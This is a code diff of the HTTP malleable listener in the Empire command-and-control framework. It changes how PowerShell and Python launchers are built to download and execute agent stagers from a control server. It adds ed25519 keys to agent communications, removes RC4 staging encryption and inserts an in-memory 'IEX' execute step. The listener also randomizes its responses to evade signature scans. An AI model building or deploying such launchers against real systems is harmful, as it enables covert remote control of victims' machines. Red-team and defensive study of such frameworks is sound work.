@@ -8,11 +8,14 @@ import sys
 import time
 import urllib.parse
 
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import ed25519
 from flask import Flask, Response, make_response, request
 from werkzeug.serving import WSGIRequestHandler
 
 from empire.server.common import encryption, helpers, malleable, packets, templating
 from empire.server.common.empire import MainMenu
+from empire.server.common.encryption import AESCipher
 from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util, log_util
@@ -61,7 +64,7 @@ class Listener:
             "Host": {
                 "Description": "Hostname/IP for staging.",
                 "Required": True,
-                "Value": f"http://{helpers.lhost()}:{80}",
+                "Value": f"http://{helpers.lhost()}",
             },
             "BindIP": {
                 "Description": "The IP to bind to on the control server.",
@@ -137,6 +140,7 @@ class Listener:
         self.thread = None
 
         # optional/specific for this module
+        self.host_address = None
         self.app = None
 
         # randomize the length of the default_response and index_page headers to evade signature based scans
@@ -150,6 +154,21 @@ class Listener:
         self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
 
         self.instance_log = log
+
+        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
+        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
+        self.agent_private_cert_key = (
+            self.agent_private_cert_key_object.private_bytes_raw()
+        )
+        self.agent_public_cert_key = encryption.publickey_unsafe(
+            self.agent_private_cert_key
+        )
+        self.server_private_cert_key = (
+            self.server_private_cert_key_object.private_bytes_raw()
+        )
+        self.server_public_cert_key = encryption.publickey_unsafe(
+            self.server_private_cert_key
+        )
 
     def default_response(self):
         """
@@ -170,6 +189,12 @@ class Listener:
             .filter(models.Profile.name == profile_name)
             .first()
         )
+
+        if not profile_data:
+            return handle_validate_message(
+                f"[!] Malleable profile not found: {profile_name}"
+            )
+
         try:
             profile = malleable.Profile()
             profile.ingest(content=profile_data.data)
@@ -190,6 +215,12 @@ class Listener:
             profile.stager.client.metadata.header("Cookie")
             profile.stager.server.output.transforms = []
             profile.stager.server.output.print_()
+
+            self.host_address, err = (
+                self.mainMenu.listenersv2.validate_listener_address(self.options)
+            )
+            if err:
+                return False, err
 
             if profile.validate():
                 # store serialized profile for use across sessions
@@ -233,13 +264,6 @@ class Listener:
             else:
                 return handle_validate_message(
                     f"[!] Unable to parse malleable profile: {profile_name}"
-                )
-
-            if self.options["CertPath"]["Value"] == "" and self.options["Host"][
-                "Value"
-            ].startswith("https"):
-                return handle_validate_message(
-                    "[!] HTTPS selected but no CertPath specified."
                 )
 
         except malleable.MalleableError as e:
@@ -314,9 +338,6 @@ class Listener:
             launcherBase += (
                 f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
             )
-
-            # ==== DEFINE RC4 ====
-            launcherBase += listener_util.powershell_rc4()
 
             # ==== BUILD AND STORE METADATA ====
             routingPacket = packets.build_routing_packet(
@@ -425,11 +446,8 @@ class Listener:
                 launcherBase += ""
             launcherBase += profile.stager.server.output.generate_powershell_r("$data")
 
-            # ==== EXTRACT IV AND STAGER ====
-            launcherBase += "$iv=$data[0..3];$data=$data[4..($data.length-1)];"
-
             # ==== DECRYPT AND EXECUTE STAGER ====
-            launcherBase += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            launcherBase += "IEX ([Text.Encoding]::UTF8.GetString($data))"
 
             if obfuscate:
                 launcherBase = self.mainMenu.obfuscationv2.obfuscate(
@@ -457,7 +475,7 @@ class Listener:
             if safe_checks and safe_checks.lower() == "true":
                 launcherBase += listener_util.python_safe_checks()
 
-            launcherBase += f"server='{host}'\n"
+            launcherBase += f"server='{self.host_address}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -531,18 +549,18 @@ class Listener:
             ):
                 launcherBase += "head=res.info().dict\n"
                 launcherBase += f"a=head['{profile.stager.server.output.terminator.arg}'] if '{profile.stager.server.output.terminator.arg}' in head else ''\n"
-                launcherBase += "a=urllib.parse.unquote(a)\n"
+                launcherBase += "data=urllib.parse.unquote(a)\n"
             elif (
                 profile.stager.server.output.terminator.type
                 == malleable.Terminator.PRINT
             ):
-                launcherBase += "a=res.read()\n"
+                launcherBase += "data=res.read()\n"
             else:
-                launcherBase += "a=''\n"
+                launcherBase += "data=''\n"
             launcherBase += profile.stager.server.output.generate_python_r("a")
 
             # download the stager and extract the IV
-            launcherBase += "a=urllib.request.urlopen(req).read();\n"
+            launcherBase += "data=urllib.request.urlopen(req).read();\n"
             launcherBase += listener_util.python_extract_stager(stagingKey)
 
             if obfuscate:
@@ -610,20 +628,42 @@ class Listener:
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http_malleable/http_malleable.ps1")
 
+            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
+
+            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
+            raw_key_bytes = (
+                self.agent_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+            raw_key_bytes = (
+                self.server_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
             template_options = {
                 "working_hours": workingHours,
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
+                "agent_private_cert_key": private_key_array,
+                "server_public_cert_key": server_public_key_array,
+                "agent_public_cert_key": public_key_array,
             }
             stager = template.render(template_options)
-
-            # make sure the server ends with "/"
-            if not host.endswith("/"):
-                host += "/"
 
             # patch in custom headers
             if profile.stager.client.headers:
@@ -641,8 +681,8 @@ class Listener:
                 listenerOptions=listenerOptions, language=language
             )
 
-            stagingKey = stagingKey.encode("UTF-8")
-            stager = listener_util.remove_lines_comments(comms_code + stager)
+            # stager = helpers.strip_powershell_comments(comms_code + stager)
+            stager = comms_code + stager
 
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.obfuscate(
@@ -652,11 +692,7 @@ class Listener:
 
             if encode:
                 return helpers.enc_powershell(stager)
-            if encrypt:
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, stager.encode("UTF-8")
-                )
+
             return stager
 
         if language.lower() == "python":
@@ -675,9 +711,12 @@ class Listener:
                 "working_hours": workingHours,
                 "kill_date": killDate,
                 "staging_key": stagingKey,
+                "agent_private_cert_key": self.agent_private_cert_key,
+                "server_public_cert_key": self.server_public_cert_key,
+                "agent_public_cert_key": self.agent_public_cert_key,
                 "profile": profileStr,
                 "session_cookie": "",
-                "host": host,
+                "host": self.host_address,
                 "stage_1": stage1,
                 "stage_2": stage2,
             }
@@ -690,11 +729,7 @@ class Listener:
 
             if encode:
                 return base64.b64encode(stager)
-            if encrypt:
-                RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
-                )
+
             return stager
 
         log.error(
@@ -821,7 +856,7 @@ class Listener:
 
         if language.lower() == "powershell":
             # PowerShell
-            updateServers = f'$Script:ControlServers = @("{host}");'
+            updateServers = f'$Script:ControlServers = @("{self.host_address}");'
             updateServers += "$Script:ServerIndex = 0;"
 
             # ==== HANDLE SSL ====
@@ -835,7 +870,7 @@ try {{
     if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {{
         # ==== BUILD ROUTING PACKET ====
         $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
-        $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
+
         {profile.get.client.metadata.generate_powershell("$RoutingPacket")}
 
         # ==== BUILD REQUEST ====
@@ -936,7 +971,7 @@ $data;
 }} catch [Net.WebException] {{
 $script:MissedCheckins += 1;
 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
-Start-Negotiate -S '$ser' -SK $SK -UA $ua;
+Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
 }}
 }}
 }};
@@ -950,9 +985,10 @@ param($Packets);
 if ($Packets) {{
 
 # ==== BUILD ROUTING PACKET ====
-$EncBytes = Encrypt-Bytes $Packets;
+$EncBytes = Aes-EncryptThenHmac -Key $Script:SessionKey -Plain $Packets
+
 $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
-$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
+
 {profile.post.client.output.generate_powershell("$RoutingPacket")}
 
 # ==== BUILD REQUEST ====
@@ -1035,7 +1071,7 @@ $vWc.Proxy = $Script:Proxy;
             sendMessage += """
 } catch [System.Net.WebException] {
 if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-Start-Negotiate -S '$ser' -SK $SK -UA $ua;
+Start-Negotiate -S "$Script:server" -SK $Script:StagingKey -UA $Script:UserAgent;
 }}}}};
 """
             return updateServers + getTask + sendMessage
@@ -1385,7 +1421,6 @@ class ExtendedPacketHandler(PacketHandler):
                     self.instance_log.warning(message)
 
                 # attempt to extract information from the request
-                agentInfo = None
                 if implementation is profile.stager and request.method == "POST":
                     # stage 1 negotiation comms are hard coded, so we can't use malleable
                     agentInfo = malleableRequest.body
@@ -1398,9 +1433,17 @@ class ExtendedPacketHandler(PacketHandler):
                 else:
                     agentInfo = implementation.extract_client(malleableRequest)
                 if agentInfo:
+                    agentInfo = listener_util.ensure_raw_bytes(agentInfo)
                     dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
-                        stagingKey, agentInfo, listenerOptions, clientIP
+                        stagingKey,
+                        self.agent_public_cert_key,
+                        self.server_private_cert_key,
+                        self.server_public_cert_key,
+                        agentInfo,
+                        listenerOptions,
+                        clientIP,
                     )
+
                     if not dataResults or len(dataResults) <= 0:
                         # log error parsing routing packet
                         message = f"{listenerName} Error parsing routing packet from {clientIP}: {agentInfo!s}."
@@ -1525,11 +1568,9 @@ class ExtendedPacketHandler(PacketHandler):
                                         version=version,
                                     )
 
-                                if language.lower() in ["python", "ironpython"]:
-                                    sessionKey = bytes.fromhex(sessionKey)
-
-                                encryptedAgent = encryption.aes_encrypt_then_hmac(
-                                    sessionKey, agentCode
+                                sessionKey = bytes.fromhex(sessionKey)
+                                encryptedAgent = AESCipher.encrypt_then_hmac(
+                                    sessionKey, agentCode.encode("UTF-8")
                                 )
 
                                 # build malleable response with agent
